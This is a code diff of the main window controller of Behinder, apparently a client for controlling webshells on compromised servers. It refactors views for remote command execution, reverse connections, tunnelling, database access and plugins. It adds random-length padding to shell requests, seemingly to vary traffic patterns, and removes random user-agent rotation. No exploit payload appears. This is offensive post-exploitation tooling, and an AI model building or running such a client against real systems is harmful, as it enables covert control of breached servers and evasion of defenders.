@@ -1,11 +1,8 @@
 package net.rebeyond.behinder.ui.controller;
 
-import net.rebeyond.behinder.utils.Base64;
 import javafx.application.Platform;
 import javafx.fxml.FXML;
 import javafx.scene.control.*;
-import javafx.scene.input.KeyCode;
-import javafx.scene.input.KeyEvent;
 import javafx.scene.layout.AnchorPane;
 import javafx.scene.layout.GridPane;
 import javafx.scene.paint.Color;
@@ -14,9 +11,12 @@ import javafx.scene.web.WebView;
 import net.rebeyond.behinder.core.Constants;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.dao.ShellManager;
+import net.rebeyond.behinder.utils.Base64;
+import net.rebeyond.behinder.utils.Utils;
 import org.json.JSONObject;
 
 import java.nio.charset.StandardCharsets;
+import java.security.SecureRandom;
 import java.util.*;
 
 public class MainWindowController {
@@ -60,9 +60,13 @@ public class MainWindowController {
     @FXML
     private DatabaseViewController databaseViewController;
     @FXML
+    private CmdViewController cmdViewController;
+    @FXML
     private RealCmdViewController realCmdViewController;
     @FXML
     private TunnelViewController tunnelViewController;
+    @FXML
+    private UpdateInfoViewController updateInfoViewController;
 
     public MainWindowController() {
     }
@@ -85,7 +89,9 @@ public class MainWindowController {
                 Runnable runner = () -> {
                     try {
                         this.doConnect();
-                        JSONObject basicInfoObj = new JSONObject(this.currentShellService.getBasicInfo());
+                        int randStringLength = (new SecureRandom()).nextInt(3000);
+                        String randString = Utils.getRandomString(randStringLength);
+                        JSONObject basicInfoObj = new JSONObject(this.currentShellService.getBasicInfo(randString));
                         final String basicInfoStr = new String(Base64.decode(basicInfoObj.getString("basicInfo")), StandardCharsets.UTF_8);
                         String driveList = (new String(Base64.decode(basicInfoObj.getString("driveList")), StandardCharsets.UTF_8)).replace(":\\", ":/");
                         String currentPath = new String(Base64.decode(basicInfoObj.getString("currentPath")), StandardCharsets.UTF_8);
@@ -99,7 +105,7 @@ public class MainWindowController {
                             webengine.loadContent(basicInfoStr);
 
                             try {
-                                MainWindowController.this.initCmdView();
+                                MainWindowController.this.cmdViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel, MainWindowController.this.basicInfoMap);
                                 MainWindowController.this.realCmdViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel, MainWindowController.this.basicInfoMap);
                                 MainWindowController.this.initSourceCodeView();
                                 MainWindowController.this.pluginViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel, MainWindowController.this.shellManager);
@@ -107,6 +113,7 @@ public class MainWindowController {
                                 MainWindowController.this.reverseViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel);
                                 MainWindowController.this.databaseViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel);
                                 MainWindowController.this.tunnelViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel);
+                                MainWindowController.this.updateInfoViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel);
                             } catch (Exception var2) {
                                 var2.printStackTrace();
                             }
@@ -116,7 +123,6 @@ public class MainWindowController {
                         });
                     } catch (final Exception var7) {
                         Platform.runLater(() -> {
-                            MainWindowController.this.initCmdView();
                             var7.printStackTrace();
                             MainWindowController.this.connStatusLabel.setText("连接失败");
                             MainWindowController.this.connStatusLabel.setTextFill(Color.RED);
@@ -150,17 +156,10 @@ public class MainWindowController {
 
             switch (var6) {
                 case 0:
-                    MainWindowController.this.cmdTextArea.requestFocus();
-                    MainWindowController.this.cmdTextArea.end();
                 case 1:
                 default:
             }
         });
-    }
-
-    private void initCmdView() {
-        String currentPath = this.basicInfoMap.get("currentPath");
-        this.cmdTextArea.setText(currentPath + " >");
     }
 
     private void initSourceCodeView() {
@@ -192,53 +191,17 @@ public class MainWindowController {
         workThread.start();
     }
 
-    public void onCMDKeyPressed(KeyEvent keyEvent) {
-        KeyCode keyCode = keyEvent.getCode();
-        int lineCount = this.cmdTextArea.getParagraphs().size();
-        String lastLine = this.cmdTextArea.getParagraphs().get(lineCount - 1).toString();
-        if (keyCode == KeyCode.ENTER) {
-            this.statusLabel.setText("[!]正在执行命令，请稍后……");
-            int cmdStart = lastLine.indexOf(">") + 1;
-            String cmd = lastLine.substring(cmdStart).trim();
-            Runnable runner = () -> {
-                try {
-                    final JSONObject resultObj = this.currentShellService.runCmd(cmd);
-                    final String statusText = resultObj.getString("status").equals("success") ? "[+]命令执行成功。" : "[-]命令执行失败。";
-                    Platform.runLater(() -> {
-                        MainWindowController.this.statusLabel.setText(statusText);
-                        MainWindowController.this.cmdTextArea.appendText("\n" + resultObj.getString("msg") + "\n");
-                        MainWindowController.this.cmdTextArea.appendText(MainWindowController.this.basicInfoMap.get("currentPath") + " >");
-                    });
-                } catch (final Exception var4) {
-                    Platform.runLater(() -> MainWindowController.this.statusLabel.setText("[-]操作失败:" + var4.getMessage()));
-                }
-
-            };
-            Thread workThread = new Thread(runner);
-            this.workList.add(workThread);
-            workThread.start();
-            keyEvent.consume();
-        }
-
-    }
-
     private void doConnect() throws Exception {
         boolean connectResult = this.currentShellService.doConnect();
-    }
-
-    private String getCurrentUserAgent() {
-        int uaIndex = (new Random()).nextInt(Constants.userAgents.length - 1);
-        String currentUserAgent = Constants.userAgents[uaIndex];
-        return currentUserAgent;
     }
 
     public void init(JSONObject shellEntity, ShellManager shellManager, Map<String, Object> currentProxy) throws Exception {
         this.shellEntity = shellEntity;
         this.shellManager = shellManager;
-        this.currentShellService = new ShellService(shellEntity, this.getCurrentUserAgent());
-        ShellService var10000 = this.currentShellService;
+        this.currentShellService = new ShellService(shellEntity);
         ShellService.setProxy(currentProxy);
         this.urlText.setText(shellEntity.getString("url"));
+        this.initTabs();
     }
 
     private void initTabs() {
